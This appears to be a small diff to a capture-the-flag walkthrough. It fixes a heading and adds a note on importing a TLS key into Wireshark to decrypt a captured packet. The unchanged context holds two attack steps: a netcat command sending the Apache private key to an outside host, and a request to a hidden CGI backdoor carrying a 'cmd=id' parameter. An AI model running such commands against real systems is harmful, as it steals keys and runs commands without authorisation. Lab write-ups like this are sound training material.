@@ -133,10 +133,11 @@ User jack may run the following commands on ubuntu:
 jack@ubuntu:/opt$ ls
 capture.pcap  urgent.txt
 
-<h3> Analysing captured packet</h3>
+<h3>Analysing captured packet</h3>
   
 you need TLS key for decryption 
 jack@ubuntu:/opt$ nc -w 3 10.x.x.x 4444 < ../etc/apache2/certs/apache.key 
+import to wireshark Edit > Preferences > Protocols > TLS
 
 GET /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id HTTP/1.1
 Host: 10.0.2.15:41312
